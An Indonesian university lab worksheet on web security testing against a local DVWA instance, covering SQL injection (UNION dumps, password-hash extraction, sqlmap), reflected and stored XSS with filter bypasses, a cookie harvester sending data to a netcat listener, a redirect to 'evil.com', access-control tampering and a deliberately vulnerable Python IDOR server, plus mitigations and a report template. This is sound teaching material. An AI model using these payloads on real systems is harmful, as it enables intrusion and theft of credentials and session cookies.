Seluruh pengujian dilakukan HANYA pada DVWA yang berjalan di mesin virtual/lokal Anda sendiri. Menggunakan teknik ini pada sistem nyata tanpa izin adalah pelanggaran hukum (UU ITE Pasal 30).

Setup DVWA & Burp Suite

1

Install & Jalankan DVWA via Docker

# Tarik image DVWA docker pull vulnerables/web-dvwa # Jalankan pada port 8888 docker run -d -p 8888:80 --name dvwa vulnerables/web-dvwa # Akses di browser: http://localhost:8888 Login: admin / password Setup: klik "Create / Reset Database"
2

Konfigurasi Burp Suite Proxy

Burp Suite → Proxy → Options → Add Listener: 127.0.0.1:8080

Firefox → Settings → Network → Manual Proxy: 127.0.0.1:8080

Import Burp CA: buka http://burpsuite → download CA cert → Install di Firefox

3

Set Security Level DVWA ke Low

DVWA → DVWA Security → Set to Low → Submit. Security Level rendah memudahkan observasi kerentanan dasar.

Bagian A — SQL Injection

Lab A: SQL Injection pada DVWA

Target: DVWA → SQL Injection module | Security Level: Low → Medium → High

A1. Classic SQLi (In-Band)

A1

Identifikasi SQLi dengan Error-based

# Buka DVWA → SQL Injection # Masukkan di field "User ID": 1' # Hasilnya: MySQL error → confirmed SQLi! You have an error in your SQL syntax... # Temukan jumlah kolom dengan UNION: 1' UNION SELECT NULL-- 1' UNION SELECT NULL,NULL-- ← 2 kolom OK # Dump first_name & last_name semua user: 1' UNION SELECT first_name,last_name FROM users--
A2

Dump Password Hash

# Ambil password (MD5 hash) dari tabel users: 1' UNION SELECT user,password FROM users-- admin | 5f4dcc3b5aa765d61d8327deb882cf99 # Crack dengan: hashcat atau online cracker 5f4dcc3b5aa765d61d8327... → "password"

A2. Blind SQLi & Otomasi SQLMap

A3

Boolean-Based Blind SQLi (Manual)

# DVWA → SQL Injection (Blind) # True condition: respons menampilkan data 1' AND 1=1-- # False condition: respons kosong/berbeda 1' AND 1=2-- # Ambil panjang nama database 1' AND LENGTH(database())=4-- ← coba 1,2,3,4... # Ambil karakter pertama nama DB 1' AND SUBSTRING(database(),1,1)='d'--
A4

Otomasi dengan SQLMap

# Salin cookie PHPSESSID dari browser DevTools # Jalankan SQLMap dengan cookie: sqlmap -u "http://localhost:8888/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \ --cookie="PHPSESSID=xxx;security=low" \ --dbs --batch [*] dvwa ← database ditemukan sqlmap -u "..." --cookie="..." -D dvwa -T users --dump
Catat untuk Laporan

Screenshot setiap payload yang berhasil, tipe SQLi yang teridentifikasi, data yang berhasil diambil, dan CVSS Score untuk temuan ini (lihat rubrik).

Bagian B — XSS

Lab B: Cross-Site Scripting pada DVWA

Target: DVWA → XSS (Reflected) & XSS (Stored) | Demonstrasikan 3 payload berbeda

B1. Reflected XSS

B1

DVWA → XSS (Reflected)

Input di field "What's your name?":

# Payload 1: Basic alert (konfirmasi XSS) <script>alert('XSS by RKS222')</script> # Payload 2: Cookie stealing ke server lokal <script>alert(document.cookie)</script> # Payload 3: Redirect ke halaman lain <script>document.location='http://evil.com'</script> # Amati URL yang terbentuk — ini reflected XSS: # http://localhost:8888/...?name=<script>alert...</script>
B2

Bypass Filter (Security Level: Medium)

# Set Security Level ke Medium # Filter memblokir <script> — bypass dengan: <img src=x onerror="alert('XSS')"> <svg onload="alert(document.domain)"> <SCRIPT>alert('Case bypass')</SCRIPT>

B2. Stored XSS

B3

DVWA → XSS (Stored) — Guestbook

Input di form Guestbook (Name & Message):

# Di field "Message" — payload stored XSS: <script>alert('Stored XSS - Semua yang buka kena!')</script> # Payload tersimpan di database # Setiap pengunjung halaman guestbook terkena! # Cookie harvester (simpan server netcat lokal): # Terminal: nc -lvp 4444 <script>new Image().src="http://127.0.0.1:4444/?c="+document.cookie</script> # Netcat: terima koneksi + cookie user lain
Pertanyaan Refleksi — XSS
  • Mengapa Stored XSS lebih berbahaya dari Reflected XSS?
  • Apakah CSP (Content-Security-Policy) berhasil memblokir payload di atas? Coba tambahkan header: Content-Security-Policy: default-src 'self'
  • Apa perbedaan dampak jika flag HttpOnly aktif pada cookie session?
Dokumentasi Wajib

Screenshot sebelum & sesudah injeksi. Catat payload, jenis XSS, dan output yang dihasilkan. Jelaskan mengapa mitigasi HttpOnly dan CSP efektif mencegah serangan ini.

Bagian C — Access Control

Lab C: Broken Access Control & IDOR

Pengujian kontrol akses pada DVWA + Simulasi IDOR pada endpoint API sederhana

C1. Akses Halaman Admin Tanpa Izin

C1

Force Browsing di DVWA

# Login sebagai user "gordonb" (bukan admin) # Coba akses langsung URL admin DVWA: http://localhost:8888/dvwa/vulnerabilities/ # Apakah modul vulnerable bisa diakses? # Coba akses phpinfo jika ada: http://localhost:8888/phpinfo.php http://localhost:8888/dvwa/docs/ # Amati dengan Burp: apakah ada parameter role? # Cari cookie atau header yang mengontrol akses
C2

Manipulasi Parameter Kontrol Akses di Burp

# Di Burp Proxy: intersep request yang mengandung # parameter role, user_type, atau is_admin # Contoh manipulasi: GET /profile?user_id=2&role=user → ubah ke: user_id=1&role=admin # Atau manipulasi cookie security level: Cookie: security=low → ubah ke high # Amati perbedaan akses yang diberikan

C2. Simulasi IDOR dengan Python Server

C3

Buat Server API Rentan Sederhana

Jalankan server Python sederhana untuk simulasi IDOR:

# server_idor.py — simpan dan jalankan from http.server import HTTPServer, BaseHTTPRequestHandler import json data = { "1001": {"user": "alice", "salary": 8000000}, "1002": {"user": "bob", "salary": 12000000}, } class Handler(BaseHTTPRequestHandler): def do_GET(self): emp_id = self.path.split('/')[-1] if emp_id in data: self.send_response(200); self.end_headers() self.wfile.write(json.dumps(data[emp_id]).encode()) python3 server_idor.py # port 8000 # Uji: curl http://localhost:8000/api/employee/1001 # Ubah ke 1002 → bisa akses data orang lain!
Solusi Mitigasi IDOR

Server harus memvalidasi: apakah user yang login memiliki hak akses atas employee ID yang diminta? Cukup bandingkan session['user_id'] == requested_id di sisi server.

Format Laporan Temuan Lab 9

Standar dokumentasi untuk setiap kerentanan yang ditemukan selama praktikum

Struktur Laporan per Temuan

T

Template Satu Temuan

1. Judul Temuan: [Nama kerentanan]
2. Kategori OWASP: A0X:2025 — [nama kategori]
3. CWE ID: CWE-XX
4. Severity: Critical / High / Medium / Low
5. CVSS v3.1 Score: [angka] — [vector string]
6. Lokasi: URL/endpoint + parameter yang rentan
7. Deskripsi: Penjelasan teknis kerentanan
